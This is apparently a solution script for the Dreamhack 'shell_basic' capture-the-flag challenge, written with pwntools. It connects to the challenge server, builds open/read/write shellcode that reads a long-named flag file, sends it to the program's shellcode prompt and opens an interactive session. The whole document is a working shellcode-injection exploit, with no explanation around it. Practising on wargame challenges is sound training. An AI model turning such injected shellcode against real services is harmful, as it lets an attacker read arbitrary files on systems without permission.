from pwn import *

p = remote("host8.dreamhack.games", 18252)
context.arch = "amd64"

dir = "/home/shell_basic/flag_name_is_loooooong"

shellcode = shellcraft.open(dir)
shellcode += shellcraft.read('rax', 'rsp', 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)

p.sendlineafter(b"shellcode: ", asm(shellcode))

p.interactive()